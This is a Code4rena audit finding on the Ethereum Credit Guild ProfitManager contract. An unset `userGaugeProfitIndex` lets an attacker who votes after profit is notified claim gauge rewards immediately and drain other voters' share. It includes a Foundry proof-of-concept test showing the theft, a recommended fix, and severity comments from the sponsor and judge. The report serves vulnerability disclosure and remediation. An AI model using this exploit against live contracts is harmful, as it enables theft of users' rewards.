  "Title": "[H-01] The `userGaugeProfitIndex` is not set correctly, allowing an attacker to receive rewards without waiting",
  "Content": "\nWhen `claimGaugeRewards()` is called for the first time before the user votes for a gauge, the `userGaugeProfitIndex` should be set to the current `gaugeProfitIndex`, later when the `gaugeProfitIndex` grows the user will be able to claim the rewards.\n\nThe problem here is that the first time `claimGaugeRewards()` is called the `userGaugeProfitIndex` is not set to anything because of this check:\n\n<https://github.com/code-423n4/2023-12-ethereumcreditguild/blob/2376d9af792584e3d15ec9c32578daa33bb56b43/src/governance/ProfitManager.sol#L416-L418>\n\n```solidity\n416:  if (_userGaugeWeight == 0) {\n417:      return 0;\n418:  }\n```\n\nSo an attacker can vote for a gauge after profit is notified, `claimGaugeRewards()` will be called for the first time in `incrementGauge()`; however, the `userGaugeProfitIndex` will not be set and will be `0`.\n\nThe attacker will then call `claimGaugeRewards()` again and because the `userGaugeProfitIndex` `== 0` it will be set to 1e18. Since the `gaugeProfitIndex` is bigger than 1e18, the attacker will receive rewards without waiting.\n\n### Impact\n\nThe attacker will receive rewards without waiting and can repeat this until all rewards are stolen. Other users will then fail to claim their rewards and will receive nothing.\n\n### Proof of Concept\n\nAdd this to `ProfitManager.t.sol` and `import \"@forge-std/console.sol\";`\n\nAs you can see, the attacker will be able to steal rewards in the same transaction.\n\n```solidity\nfunction testAttackClaimAfterProfit() public {\n        address attacker = makeAddr(\"attacker\");\n        vm.startPrank(governor);\n        core.grantRole(CoreRoles.GOVERNOR, address(this));\n        core.grantRole(CoreRoles.CREDIT_MINTER, address(this));\n        core.grantRole(CoreRoles.GUILD_MINTER, address(this));\n        core.grantRole(CoreRoles.GAUGE_ADD, address(this));\n        core.grantRole(CoreRoles.GAUGE_PARAMETERS, address(this));\n        core.grantRole(CoreRoles.GAUGE_PNL_NOTIFIER, address(this));\n        vm.stopPrank();\n\n        vm.prank(governor);\n        profitManager.setProfitSharingConfig(\n            0, // surplusBufferSplit\n            0.5e18, // creditSplit\n            0.5e18, // guildSplit\n            0, // otherSplit\n            address(0) // otherRecipient\n        );\n        guild.setMaxGauges(1);\n        guild.addGauge(1, gauge1);\n        guild.mint(attacker, 150e18);\n        guild.mint(bob, 400e18);\n\n\n        vm.prank(bob);\n        guild.incrementGauge(gauge1, 400e18);\n        \n\n        credit.mint(address(profitManager), 20e18);\n        profitManager.notifyPnL(gauge1, 20e18);\n\n        //Attacker votes for a gauge after it notifies profit\n        //The userGaugeProfitIndex of the attacker is not set \n        vm.prank(attacker);\n        guild.incrementGauge(gauge1, 150e18);\n       \n        //Because the userGaugeProfitIndex is not set it will be set to 1e18\n        //The gaugeProfitIndex will be 1.025e18 so the attacker will steal the rewards\n        profitManager.claimGaugeRewards(attacker,gauge1);\n        console.log(credit.balanceOf(attacker));\n\n        //Other users will then fail to claim their rewards\n        vm.expectRevert(bytes(\"ERC20: transfer amount exceeds balance\"));\n        profitManager.claimGaugeRewards(bob,gauge1);\n        console.log(credit.balanceOf(bob));\n    }\n```\n\n### Tools Used\n\nFoundry\n\n### Recommended Mitigation Steps\n\nWhen `userGaugeProfitIndex` equals `0` it should be set to the current `gaugeProfitIndex` and it should be set the first time `claimGaugeRewards()` is called.\n\n**[eswak (Ethereum Credit Guild) confirmed, but disagreed with severity and commented via duplicate issue #1211](https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/1211#issuecomment-1893842567):**\n> Disputing severity (I think it's more fit for medium because there is no loss of user funds, just rewards).\n\n**[TrungOre (judge) commented via duplicate issue #1211](https://github.com/code-423n4/2023-12-ethereumcreditguild-findings/issues/1211#issuecomment-1901052544):**\n> I consider this issue a high severity because the rewards in ProfitManager are matured yield, which should be distributed to the intended users.
